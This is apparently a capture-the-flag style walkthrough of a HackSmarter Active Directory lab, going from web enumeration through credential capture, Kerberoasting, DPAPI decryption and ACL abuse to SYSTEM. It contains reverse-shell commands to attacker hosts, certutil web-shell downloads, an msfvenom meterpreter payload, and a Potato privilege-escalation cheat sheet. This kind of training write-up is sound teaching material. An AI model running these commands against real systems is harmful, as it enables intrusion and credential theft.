---
title: "HackSmarter City Council Walkthrough  "
date: 2026-06-05 00:00:00 +0000
categories: [ HackSmarterlabs]
tags: [Hacksmarterlabs , Active Directory]
---


<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/597e0165-d39a-4dac-8824-37ac4bb0905c" />


## Objective / Scope :

A local municipality recently survived a devastating ransomware campaign. While their internal IT team believes the infection has been purged and the holes plugged, the Board of Supervisors isn't taking any chances. They’ve brought in Hack Smarter to provide a "second pair of eyes."

Your mission is to perform a comprehensive penetration test of the internal infrastructure. Reaching Domain Admin isn't the endgame; treat this like a real engagement. See how many vulnerabilities you're able to identify.


## Solution :


We first start by scanning the target :

<img width="1045" height="785" alt="image" src="https://github.com/user-attachments/assets/a0ecbf80-07ba-495f-ba8c-9d8f7aabe2f3" />

Looking at the Open ports we can already confirm this is a domain controller (Port 88 for kerberos , ldap and dns present as well) , since this is an AD machine i always like to keep this quick checklist in mind when doing it .

```bash
Scan All TCP Ports : Check The useful note Down for more info .
Check ldap , rpc , smb with anonymous access . Check for Public Shares .
Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
Check usernames found with kerbrute .
Search for ASREP Roastable Users .
Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
Try to authenticate using every protocol .
Enumerate shares with those Users found . Use netexec to download .
Check Certipy for Vulnerable Templates if there is an ADCS in place .
If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
If we can’t privesc , we can move to Blood Hound .
```

Now before we start let's make sure we add the Domain name as well as the Hostname for the machine to our /etc/hosts file , we can use nxc to make life easier .

<img width="1348" height="743" alt="image" src="https://github.com/user-attachments/assets/971ab407-c32d-4afc-882c-c46b15c04d20" />

Now that everything is set , the first thing i like to try is ASREPROASTING , for this we need a list of valid usernames on the domain , let's first enumerate the services anonymously to check if we can get a list of users .

<img width="1098" height="702" alt="image" src="https://github.com/user-attachments/assets/b3c3530f-0910-4e95-865e-7e5a6fe7463b" />

This didn't return anything useful , i tried enumerating RPC as well as ldap but that didn't work either . 

<img width="1083" height="606" alt="image" src="https://github.com/user-attachments/assets/d9fd8927-a12b-40d6-a7af-383a3c056b6b" />

Now we can move to enumerating the web application , maybe it contains a list of users that we can use (An About us page or something that contains names) .

<img width="1422" height="713" alt="image" src="https://github.com/user-attachments/assets/600da8f8-67bd-42df-96fd-1bfd3f435694" />

We do find some names , we can use a tool like username anarchy or any other tool that will generate a list of combinations using these names and we can test those names using kerbrute to find valid users .

```bash
wget https://raw.githubusercontent.com/mohinparamasivam/AD-Username-Generator/refs/heads/master/username-generate.py
python3 username-generator.py -u username.txt -o genrated_username.txt 
```
<img width="1386" height="678" alt="image" src="https://github.com/user-attachments/assets/7abae086-2cf8-442f-b948-a08d075b1e86" />

Now let's validate these users :

<img width="991" height="517" alt="image" src="https://github.com/user-attachments/assets/6de0ed10-c71f-464e-9bd9-0673f1973560" />

Now that we have a list of valid users let's test for ASREPROASTING :

<img width="1124" height="345" alt="image" src="https://github.com/user-attachments/assets/470f2663-1886-4e14-be40-04175760f31f" />

Sadly this didn't work either . 

Let's go back and enumerate the application further .

<img width="1468" height="794" alt="image" src="https://github.com/user-attachments/assets/5a75d7d4-e5b5-46b9-8541-62bfe721ca06" />

We did find this endpoint which shows us some binaries we can download for the application to test it , we will download the linux version to analyze it further , maybe reverse engineer it using ghidra will give us some creds , you never know .

<img width="1616" height="787" alt="image" src="https://github.com/user-attachments/assets/d3a38260-37b2-4489-aec9-f97d618882a3" />

Once we download it and run it , we find that on all the features that exist , we can submit an application , if we click on it we can see in the log section that the application makes a connection to the DC that we specified or needs to be specified and connects to it via LDAP.

<img width="1041" height="571" alt="image" src="https://github.com/user-attachments/assets/8b5702bd-7298-4513-af3d-92b6b7822c57" />

Now few thing to note here , First it uses LDAP not LDAPS , so credentials might be transmitted in plain text , second thing we see from the documentation that we're supposed to give it a DC to connect to :

<img width="1210" height="644" alt="image" src="https://github.com/user-attachments/assets/d156a939-e4f2-4ce5-8b5d-90aed969f0c1" />

Now one thing we can try is to setup a listener on port 389 which is the port for LDAP and put our own IP address as the DC IP in the hostfile this way we can trick the app into connecting to us , that way we can retrieve the creds for the user svc_service .

<img width="868" height="696" alt="image" src="https://github.com/user-attachments/assets/1e47298f-4181-47c1-812b-efb1cbed8ac0" />

And now if we submit an application like we normally do :

<img width="1652" height="589" alt="image" src="https://github.com/user-attachments/assets/acefa338-6558-47db-bfca-b4134983c1ab" />

We get the password for the service account : svc_service !

"-u 'svc_services_portal' -p 'PortAl1337'"

Now we can test these creds to see if they are valid , if they are then first thing i like to do is to get a list of all the users on the domain , then check ASREPROASTING again and Kerberoasting since we have valid creds. 

<img width="1854" height="673" alt="image" src="https://github.com/user-attachments/assets/b7a6ffeb-75fe-4d5c-a92a-2bf024d325c2" />

Perfect as we can see we found many users that weren't in the website as well as some service accounts . Now let's check for Kerberoasting and ASREPROASTING :

(Also make sure you change the IP on the /etc/hosts file to the target IP)

<img width="1455" height="772" alt="image" src="https://github.com/user-attachments/assets/fd8561db-1824-4a90-a16d-8489537dce96" />

ASREPROASTING didn't work since no user has UF_DONT_REQUIRE_PREAUTH but we do get a TGS for the clerk.john user that we can try to crack using Hashcat or john .

" -u 'clerk.john' -p 'clerkhill' "

<img width="1290" height="681" alt="image" src="https://github.com/user-attachments/assets/d7f72212-1a04-404a-bc5a-4b6e9a0ab8bf" />

Perfect we find that clerk has WRITE permissions over a specific Share . Always, if we have Write access to a share, think about uploading an .lnk file that will connect back to our machine so that we can steal a hash. If we see that there is a web server that hosts files from that share, we can always try and upload an ASPX reverse shell or just a webshell (depends on the technology used, but since it's Windows it's most probably going to be ASP or ASPX). After that, we can execute it and get a shell as the web server user in some cases.

Now either we can use NTLMtheaft , generate the file then upload it on the share and setup responder and wait , or we can use nxc module slinky which will generate the share and upload it for us .

```bash
https://github.com/Greenwolf/ntlm_theft
git clone https://github.com/Greenwolf/ntlm_theft.git
cd ntlm_theft
python3 ntlm_theft.py --generate modern --server tun0 --filename "Please_Clickit"     
```

If none of them work i will try a recent CVE that does basically the same thing . 

```bash
https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC
```

But for now let's first test NXC :

```bash
nxc smb $target -u 'clerk.john' -p 'clerkhill' -M slinky -o NAME=Final_test SERVER=10.200.62.83
```

<img width="1828" height="850" alt="image" src="https://github.com/user-attachments/assets/65f4c570-063c-4938-a766-62c640b15c5d" />

Just like that we are able to get the NTLMV2 hash for the user Jon Peters .

<img width="1146" height="658" alt="image" src="https://github.com/user-attachments/assets/0d6c4c96-8668-491b-a31e-9292c44348af" />

The hash is easily crackable , now as we can see the user doesn't have access to any new shares , can't RDP to the machine , so our only option will be BloodHound to be able to see if he has any useful ACLs we can abuse .

Steps to setup BloodHound : 

```bash
# To get the ZIP file :
nxc ldap $target -u 'hellyr' -p 'H3lenaR!2025' --bloodhound --collection All --dns-server $target
# To run BloodHound : 
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install
./bloodhound-cli resetpwd
Visit : http://localhost:8080/ui/login 
```

<img width="1397" height="583" alt="image" src="https://github.com/user-attachments/assets/a7984ae2-0365-4e68-b8d2-abcb8881fce7" />

Perfect our user has Generic Write over 3 users , one way to abuse this is by adding an SPN to those users and then performing a normal kerberoast attack , this is what's called targeted kerberoasting , there is a tool that we can use for this , or we could do it manually via Bloodyad , we add the SPN and then request the ticket and crack it .

To save time i will use the tool Targeted_kerberoast that automates this process for us .

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast
python3 targetedKerberoast.py -v -d 'city.local' -u 'jon.peters' -p '1234heresjonny' 
```

<img width="1335" height="754" alt="image" src="https://github.com/user-attachments/assets/cbcc517c-fdd5-44e9-b0a4-b081b654dd6a" />

Perfect now put those Hashes in a file and crack it using John or Hashcat . 

<img width="936" height="689" alt="image" src="https://github.com/user-attachments/assets/3786444d-d754-40f3-abcb-c32bba4feb88" />

We got 2 new users now , Maria and Nina . 

Let's first check Maria :

<img width="1485" height="505" alt="image" src="https://github.com/user-attachments/assets/5fc91ed1-cc93-49e2-8e77-3d45b12469e2" />

Sadly this user has less access than the previous ones :) , BloodHound shows she has no OutBound object control , no usefuul groups so let's move on to nina  .

<img width="1281" height="490" alt="image" src="https://github.com/user-attachments/assets/1b4b6306-d4f6-429a-8697-475c75ac8f31" />

No RDP access as well , but she can Read the Backup Share . (Bloodhound shows she has no Outbound object control nor useful groups that we can abuse)

Lets check this Backup Share .

<img width="975" height="572" alt="image" src="https://github.com/user-attachments/assets/d5f5384f-223f-44c0-a790-28e78ddd56ee" />

We find that there are WMI files , which are Userprofile backups . Let's explore this user's profile .

<img width="1383" height="573" alt="image" src="https://github.com/user-attachments/assets/cb71a626-9185-48ed-8027-959b53f1a412" />

Openning the Sam WMI file , we don't find anything useful , a message in the desktop about access but nothing useful . 

<img width="1313" height="802" alt="image" src="https://github.com/user-attachments/assets/84384b52-a794-49cc-9516-5f896d9244a0" />

In clerk.john's profile we find an interesting email from Emma, where she asks him to temporarily use her credentials and store them in Windows Credential Manager, which uses DPAPI to encrypt them. DPAPI credentials can be decrypted if we have the user's password and their SID, which we already have . The password was previously cracked as clerkhill. 

Now there is a tool from impacket specially for decrypting DPAPI secrets "impacket-dpapi" we first extract the master key, then use it to decrypt the credential blob, which will get us Emma's plaintext credentials stored by clerk.john.

Quick Explanation : 

When you save something in Credential Manager, Windows doesn't store it in plaintext , it encrypts it using DPAPI. The encrypted blob gets saved as a file in:
AppData/Roaming/Microsoft/Credentials/

But DPAPI encryption is tied to the user's password
This is the key weakness , DPAPI uses the user's own password as part of the encryption. So if you know the user's password, you can decrypt anything they encrypted.

The Master Key is what comes in between you could say :
DPAPI doesn't directly use the password to encrypt , it uses a Master Key, which itself is encrypted with the user's password. So the chain is:
Password + SID → decrypt Master Key
Master Key → decrypt the credential blob
Credential blob → Emma's plaintext password


==> Now First thing first wen should extract the Profile locally , we can use a tool called wmiexract :

```bash
wimextract clerk.john_ProfileBackup_0729.wim 1 --dest-dir=/home/kali/HackSmarter/City_CounCIL/clerk_profile
```

<img width="1167" height="414" alt="image" src="https://github.com/user-attachments/assets/ac713541-d645-46b7-b660-c06e031c4192" />

Now we can open it locally and navigate it normally :

<img width="1078" height="576" alt="image" src="https://github.com/user-attachments/assets/4fefac67-de1a-4c4d-b82e-e5ec1ce98a24" />

We find the DPAPI credential blob — 03128079C6E14F37F5AEBDD69E344291.

It's a binary encrypted file that contains Emma's credentials that clerk.john saved into Windows Credential Manager. It's completely unreadable as-is , just encrypted bytes , which is why we need the master key to decrypt it.

Now let's go grab the Master key located usually here : AppData/Roaming/Microsoft/Protect/SID

<img width="1391" height="655" alt="image" src="https://github.com/user-attachments/assets/e1b545ce-27b9-4cca-bb58-871d9e49dbc7" />

The master key file is de222e76-cb5d-418f-a1c2-7e4e9dfe29e1. We decrypt it using clerk.john's SID and cracked password:

```bash
impacket-dpapi masterkey -file /home/kali/HackSmarter/City_CounCIL/clerk_profile/AppData/Roaming/Microsoft/Protect/S-1-5-21-407732331-1521580060-1819249925-1103/de222e76-cb5d-418f-a1c2-7e4e9dfe29e1 -sid S-1-5-21-407732331-1521580060-1819249925-1103 -password clerkhill 
```

<img width="1918" height="503" alt="image" src="https://github.com/user-attachments/assets/117092f1-e033-43b0-82cf-a61b51c146d3" />

Now that we got the master key , let's decrypt the Credentials .

```bash
impacket-dpapi credential -file /home/kali/HackSmarter/City_CounCIL/clerk_profile/AppData/Roaming/Microsoft/Credentials/03128079C6E14F37F5AEBDD69E344291 -key 0xedfc873c4b843cb27b48cb55d829bc24c8d2be3fd50ce2aa7ba72b8da6ec65afd41412dfecd16f38a120cadf4089dabb9a1817874e37bbf0d6861117a39dfbbd
```
<img width="1907" height="401" alt="image" src="https://github.com/user-attachments/assets/dd167e93-6d50-44a8-9f26-b870e4e90ad9" />

Perfect we got the password for emma : 

```bash
Username    : city.local\emma.hayes
Unknown     : !Gemma4James!
```
<img width="996" height="211" alt="image" src="https://github.com/user-attachments/assets/0a4717d7-5c82-4890-89d1-14a932b13e25" />

Let's go back to Bloodhound to see what privileges emma has . 

<img width="918" height="726" alt="image" src="https://github.com/user-attachments/assets/0e44a8e6-d691-4c76-a78c-3d1c28d26d16" />

Ah she has Generic write over Web Admin , another Targeted Kerberoast angle :)

```bash
python3 targetedKerberoast.py -v -d 'city.local' -u 'emma.hayes' -p '!Gemma4James!' 
```
<img width="1240" height="722" alt="image" src="https://github.com/user-attachments/assets/18a38d65-fda8-4266-9cf9-5c3aacb2a2a8" />

Now let's try to crack it : 

<img width="996" height="313" alt="image" src="https://github.com/user-attachments/assets/1013cd17-c967-4ce6-8f70-32f1bae5f356" />

Sadly we can't crack the Hash . 

We see another user that we have Write DACL over which is SAM.BROK , he is the only one we will be interested in as he's a member of the Remote management group :

<img width="1648" height="537" alt="image" src="https://github.com/user-attachments/assets/74f93bbf-a3df-41d4-8126-196046af1758" />

Now let's give ourselves Generic All over this user and change his password to login . 

```bash
bloodyad --host DC.domain.local -d 'city.local' -u 'emma.hayes' -p '!Gemma4James!' add genericAll 'SAM.BROOKS' 'emma.hayes'
bloodyad --host DC.domain.local -d 'city.local' -u 'emma.hayes' -p '!Gemma4James!' add genericAll 'SAM.BROOKS' 'emma.hayes' set password 'SAM.BROOKS' 'WEAK123.' 
```
<img width="1345" height="369" alt="image" src="https://github.com/user-attachments/assets/595f42ad-7d5c-431a-9ea5-24cb61cd57f0" />

Bad news , the account is disabled -_- , let's use Bloodyad to enable it .

```bash
bloodyad --host $target -d 'city.local' -u 'emma.hayes' -p '!Gemma4James!' remove uac 'sam.brooks' -f ACCOUNTDISABLE
```

<img width="1497" height="424" alt="image" src="https://github.com/user-attachments/assets/7b686baa-8c02-4e40-80f0-1d7062ffb5b0" />

Perfect , now we can login as that user , and get our user flag .

<img width="1332" height="684" alt="image" src="https://github.com/user-attachments/assets/51980aa8-77a4-4901-ac52-6b5a9ae73f2b" />

I tried importing Winpeas , but couldn't find vectors for privesc , it has to be through the Web Admin user since we got a hint earlier from the user's profile .

Now we have Write DACL over the City OPS OU , which contains these users : 

<img width="1430" height="603" alt="image" src="https://github.com/user-attachments/assets/69701872-4380-46e1-abf0-ca7005ddf72a" />

The fact that we have generic write over Web Admin will allow us to move it to any OU , we will move him to the CityOps where we have Write DACL that way we can give ourselves Generic All over him and change his password instead of trying to crack the Hash.

Now first let's give ourselves Generic All over the City Ops OU . since this is not just a user , i will use dacledit rather than bloodyad : 

```bash
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'emma.hayes' -target-dn 'OU=CITYOPS,DC=CITY,DC=LOCAL' 'city.local'/'emma.hayes':'!Gemma4James!'
```

<img width="1796" height="231" alt="image" src="https://github.com/user-attachments/assets/f0ed42b3-3ead-4048-ad34-c1215d52a753" />

Perfect now we need to move the Web admin from OU=QUARANTINE to OU=CITYOPS , to do this we first need a LDIF File :

An LDIF (LDAP Data Interchange Format) file is a standard, plain text file format used to describe directory entries or represent a set of directory modification requests (such as adds, deletes, and moves) for execution on an LDAP-compliant server.

Here is the content of the LDIF File : 

```bash
dn: CN=WEB ADMIN,OU=QUARANTINE,DC=CITY,DC=LOCAL
changetype: modrdn
newrdn: CN=WEB ADMIN
deleteoldrdn: 1
newsuperior: OU=CITYOPS,DC=city,DC=local
```
Once we write the file we can use a tool called ldapmodify that will apply these changes . 

<img width="1125" height="330" alt="image" src="https://github.com/user-attachments/assets/80c1d7e3-11d3-4287-b55b-8ed76e0690da" />

Perfect , now all we have to do is to change the WEB_ADMIN password , i already gave our user Generic all over the entire OU , so by default we have generic all over WEB_Admin since he is now part of it . 

<img width="1507" height="347" alt="image" src="https://github.com/user-attachments/assets/49e533d7-deb1-4888-9f74-5dfd3a46e508" />

Perfect , we have control over the WEB_ADMIN now , we can't Winrm but we already have a shell with MARK , we can use Runas to execute a shell as the WEB_ADMIN user . 

```bash
https://github.com/antonioCoco/RunasCs/releases/tag/v1.5
```

Now we just import it to our Winrm Shell , it should be pretty easy since we're using evil winrm , just use the Upload functionality .

Now we can launch a new command line using the Runas Tool , for this we will need to set up our listener first : 

```bash
# On our kali :
nc -lnvp 1212

# On Winrm :
.\RunasCs.exe "WEB_ADMIN" "Weak123." cmd.exe -r OUR_IP:1212
```

<img width="1782" height="755" alt="image" src="https://github.com/user-attachments/assets/4fe7f042-a3f5-461a-b77c-3e1e6033a2c6" />

Perfect , we get a shell as the WEB_ADMIN , we have full control over the Web app which means we can upload a Web shell directly and interact with it , and it will run commands with the web app permissions .

This is a usual directory for Web app running on Windows : C:\inetpub\wwwroot\uploads

Now a simple aspx Web Shell will do just fine . 

```bash
wget https://raw.githubusercontent.com/grCod/webshells/refs/heads/master/webshells/shell.aspx
```

<img width="1705" height="640" alt="image" src="https://github.com/user-attachments/assets/f5fcd38b-885c-476e-a208-a031de702e5b" />

Now we just move it to this directory : C:\inetpub\wwwroot\uploads Or cd into that directory , use certutil to Download it . 

```bash
# On our Kali
wget https://raw.githubusercontent.com/grCod/webshells/refs/heads/master/webshells/shell.aspx
python3 -m http.server 80

# On the Windows machine : 
certutil.exe -urlcache -split -f http://10.200.62.83/shell.aspx 
```

<img width="1897" height="566" alt="image" src="https://github.com/user-attachments/assets/25f301f7-821c-4b45-a46e-33418322d25f" />

I tried Uploading multiple web shells finally this is the one that worked : 

```bash
# On our Kali
wget https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/asp/cmd.aspx
python3 -m http.server 80

# On the Windows machine : 
certutil.exe -urlcache -split -f http://10.200.62.83/shell.aspx 
```

<img width="1681" height="614" alt="image" src="https://github.com/user-attachments/assets/e84cc22f-e061-4191-9d19-32052628df8e" />

Now if we visit /uploads/cmd.aspx we should get our web shell . 

<img width="1256" height="657" alt="image" src="https://github.com/user-attachments/assets/83e2ea0a-fd1b-40e2-9178-072f330bff18" />

Now to turn it into a reverse shell , i generated this executable with msfvenom , then setup a listener for it using metasploit mutli handler :

```bash
# Generate the payload : 
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.200.62.83 LPORT=4444 -f exe -o reverse.exe

# To set up our listener : 

msf > use exploit/multi/handler 
msf exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf exploit(multi/handler) > run
```

Now just like before we host a python server and use certutil to transfer the payload : 

<img width="1900" height="607" alt="image" src="https://github.com/user-attachments/assets/5e863700-d401-4e5b-b0f7-0c4ae9082ff6" />

Now we just need to run the payload from our webshell . 

<img width="883" height="537" alt="image" src="https://github.com/user-attachments/assets/6396d695-1db2-43c9-9471-09220764a9ea" />

Now we execute it : 

<img width="838" height="480" alt="image" src="https://github.com/user-attachments/assets/77b3d667-4381-44c8-b7a6-873a6bd23544" />

It hangs so this is a good sign , if we go back to our metasploit listner : 

<img width="1368" height="741" alt="image" src="https://github.com/user-attachments/assets/e7bc4308-7151-4516-aa1f-b13cab0ebc72" />

We see that we got our Reverse Shell , now Most web app already have SE impersonate enabled so the privesc is pretty easy from there , we just use one of the Potato attacks and get our shell as system .

Now in my case i will make my life easier and use Meterpreter to privesc , but you could do it manually , just transfer the potato exe and run it and you should get System .

Here is a step by step guide from my methodology : 

```bash
If we have this we can try all Potato attacks and see which one works . 

# https://github.com/BeichenDream/GodPotato/releases/tag/V1.20

.\Godpotato-NET4.exe -cmd "cmd.exe" : Run this on the windows machine . 
Or
.\Godpotato-NET4.exe -cmd "powershell.exe -e ENCODED REVERSE SHELL BACK TO US"
nc -lnvp Port : to catch the Shell as System . 

# https://github.com/CCob/SweetPotato/blob/master/PrintSpoofer.cs

echo 'C:\windows\temp\nc.exe -e cmd.exe KALIIP PORT' > rev.bat 

.\SweetPotato.exe -p rev.bat .

# https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

.\PrintSpoofer64.exe -i -c cmd : Run this on the Windows machine . 

# https://github.com/ohpe/juicy-potato/releases/tag/v0.1 : DOC in Github . 

.\juicypotato.exe -l 3375 -t * -p " C:\windows\temp\nc.exe -e cmd.exe KALIIP PORT "

====> Another way : 

echo 'C:\windows\temp\nc.exe -e cmd.exe KALIIP PORT' > rev.bat 

.\juicypotato.exe -l 3375 -t * -p rev.bat .
```

<img width="1086" height="656" alt="image" src="https://github.com/user-attachments/assets/56c903d1-5c7b-4f65-9275-5a76c3acf24b" />

From there we can get our Root flag from the administrator Desktop . 

<img width="951" height="648" alt="image" src="https://github.com/user-attachments/assets/137555ee-43be-48c0-8ac5-088b21093d2d" />

That was all for this lab , pretty long tbf but very enjoyable , See you in the next one :)
